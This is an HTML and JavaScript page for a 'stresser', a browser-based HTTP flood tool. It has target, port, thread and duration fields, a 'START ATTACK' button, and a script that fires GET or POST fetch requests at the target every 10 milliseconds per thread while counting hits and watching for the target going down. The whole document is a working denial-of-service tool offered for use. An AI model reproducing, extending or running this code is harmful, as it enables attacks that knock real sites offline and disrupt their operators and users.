<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<title>SWEG-Stresser | Fixed</title>
<style>
:root{--azul:#a8d1ff;--bg:#1e1e1e;--card:#2a2a2a;--border:#7fc7ff;}
body{margin:0;background:var(--bg);color:#fff;font-family:Segoe UI;display:flex;height:100vh;align-items:center;justify-content:center;}
.container{width:90%;max-width:600px;background:var(--card);border:1px solid var(--border);border-radius:12px;padding:30px 40px;box-shadow:0 0 20px var(--azul);}
h1{text-align:center;color:var(--azul);margin-bottom:15px;font-size:28px;}
label{display:block;margin:10px 0 6px;font-size:14px;}
input,select,button{width:100%;padding:10px;border-radius:6px;border:1px solid var(--border);background:#111;color:#fff;font-size:14px;}
button{margin-top:20px;background:var(--azul);color:#000;font-weight:700;cursor:pointer;}
button:hover{filter:brightness(1.15);}
.stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin:15px 0;font-size:13px;}
.stat-box{background:#111;border:1px solid var(--border);border-radius:6px;padding:8px;text-align:center;}
.stat-box span{display:block;font-size:18px;font-weight:700;color:var(--azul);}
#log{height:100px;font-size:12px;overflow-y:auto;background:#111;border:1px solid var(--border);padding:8px;border-radius:6px;}
</style>
</head>
<body>
<div class="container">
  <h1>SWEG-Stresser</h1>

  <label>Target IP / Domain</label>
  <input id="host" placeholder="127.0.0.1"/>

  <label>Port</label>
  <input id="port" type="number" value="80"/>

  <label>Method</label>
  <select id="method">
    <option value="http">HTTP-GET</option>
    <option value="http-post">HTTP-POST</option>
  </select>

  <label>Threads</label>
  <input id="threads" type="number" value="100"/>

  <label>Duration (s)</label>
  <input id="duration" type="number" value="60"/>

  <button id="startBtn" onclick="toggleAttack()">START ATTACK</button>

  <div class="stats">
    <div class="stat-box">Sent<span id="sent">0</span></div>
    <div class="stat-box">Success<span id="ok">0</span></div>
    <div class="stat-box">Failed<span id="fail">0</span></div>
    <div class="stat-box">Down?<span id="down">NO</span></div>
  </div>

  <pre id="log"></pre>
</div>

<script>
let running=false,intervals=[],sent=0,ok=0,fail=0,down=false;

function toggleAttack(){
  if(running){stopAttack();return;}
  running=true;
  sent=ok=fail=0;down=false;
  updateStats();
  document.getElementById('startBtn').textContent='STOP ATTACK';
  const host=document.getElementById('host').value.trim();
  const port=parseInt(document.getElementById('port').value)||80;
  const method=document.getElementById('method').value;
  const threads=parseInt(document.getElementById('threads').value)||100;
  const duration=parseInt(document.getElementById('duration').value)||60;
  log('Attack started → '+host+':'+port+' | '+method+' | Threads:'+threads+' | Duration:'+duration+'s');
  for(let i=0;i<threads;i++){
    const t=setInterval(()=>{
      sent++;
      updateStats();
      fetch('http://'+host+':'+port+(method==='http'?'/?'+Math.random():''),{
        method:method==='http'?'GET':'POST',
        body:method==='http-post'?Math.random().toString():undefined,
        mode:'no-cors'
      }).then(r=>{
        if(r.status>=500){if(!down){down=true;log('Target returned HTTP 5xx – possible DOWN!');}}
        ok++;
        updateStats();
      }).catch(()=>{
        fail++;
        updateStats();
      });
    },10);
    intervals.push(t);
  }
  setTimeout(stopAttack,duration*1000);
}

function stopAttack(){
  running=false;
  document.getElementById('startBtn').textContent='START ATTACK';
  intervals.forEach(t=>clearInterval(t));
  intervals=[];
  log('Attack stopped');
}

function updateStats(){
  document.getElementById('sent').textContent=sent;
  document.getElementById('ok').textContent=ok;
  document.getElementById('fail').textContent=fail;
  document.getElementById('down').textContent=down?'YES':'NO';
}

function log(msg){
  const el=document.getElementById('log');
  el.textContent+='['+new Date().toLocaleTimeString()+'] '+msg+'\n';
  el.scrollTop=el.scrollHeight;
}
</script>
</body>
</html>
